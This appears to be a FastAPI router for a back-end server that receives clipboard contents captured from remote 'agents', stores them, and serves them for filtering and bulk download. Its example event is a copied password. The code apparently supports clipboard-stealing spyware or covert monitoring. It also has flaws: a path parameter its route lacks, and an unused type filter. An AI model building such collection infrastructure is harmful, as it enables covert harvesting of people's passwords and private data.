from datetime import datetime
import json
from fastapi import APIRouter, Depends, Query, Path, Body
from fastapi.responses import StreamingResponse
from sqlalchemy.orm import Session

from app.db.database import get_db
from app.models import Clipboard

router = APIRouter(prefix="/clipboards", tags=["Clipboards"])

@router.post("/{agent_id}")
def ingest_clipboards(
    agent_id: str = Path(..., description="Unique ID of the agent sending the clipboard events"),
    data: dict = Body(..., description="JSON object containing an 'events' array with clipboard events"),
    db: Session = Depends(get_db)
):
    """
    Ingest clipboard events for a specific agent. The request body should contain a JSON object with an "events" array, where each event has the following structure:
{
    "ts": "2024-06-01T12:00:00Z",
    "app": "chrome.exe",
    "value": "password1234!"
}
    """
    events = data.get("events", [])

    objs = []

    for e in events:
        objs.append(
            Clipboard(
                agent_id=agent_id,
                timestamp=datetime.fromisoformat(e["ts"].replace("Z", "")),
                app=e.get("app"),
                value=e.get("value"),
            )
        )

    db.bulk_save_objects(objs)
    db.commit()

    return {"inserted": len(objs)}

@router.get("/")
def get_clipboards(
    agent_id: str = Query(..., description="ID of the agent to retrieve clipboards for"),
    start_time: str | None = Query(None, description="Filter by start time (eg. '2024-06-01T00:00:00Z')"),
    end_time: str | None = Query(None, description="Filter by end time (eg. '2024-06-01T00:00:00Z')"),
    app: str | None = Query(None, description="Filter by application name (case-insensitive, partial match)"),
    type: str | None = Query(None, description="Type of clipboard event (e.g., 'keypress', 'keydown', 'keyup')"),
    limit: int = Query(100, ge=1, le=1000, description="Limit must be between 1 and 1000"),
    offset: int = Query(0, ge=0, description="Offset must be non-negative"),
    db: Session = Depends(get_db),
):
    """
    Retrieve clipboards for a specific agent with optional filtering by time range and application.
    """
    query = db.query(Clipboard).filter(Clipboard.agent_id == agent_id)

    if start_time:
        query = query.filter(
            Clipboard.timestamp >= datetime.fromisoformat(start_time)
        )

    if end_time:
        query = query.filter(
            Clipboard.timestamp <= datetime.fromisoformat(end_time)
        )

    if app:
        app = app.lower()
        query = query.filter(Clipboard.app.ilike(f"%{app}%"))


    total = query.count()

    results = (
        query.order_by(Clipboard.timestamp.desc())
        .offset(offset)
        .limit(limit)
        .all()
    )

    return {
        "total": total,
        "limit": limit,
        "offset": offset,
        "data": results
    }

@router.get("/download")
def download_clipboards(
    agent_id: str = Path(..., description="ID of the agent to download clipboards for"), 
    db: Session = Depends(get_db)
):
    """
    Download all clipboards for a specific agent as a JSON Lines file.
    """
    query = (
        db.query(Clipboard)
        .filter(Clipboard.agent_id == agent_id)
        .order_by(Clipboard.timestamp.asc())
    )

    def generate():
        for log in query:
            yield json.dumps({
                "ts": log.timestamp.isoformat() + "Z",
                "app": log.app,
                "value": log.value
            }) + "\n"

    return StreamingResponse(
        generate(),
        media_type="application/jsonl",
        headers={
            "Content-Disposition": f"attachment; filename={agent_id}_clipboards.jsonl"
        },
    )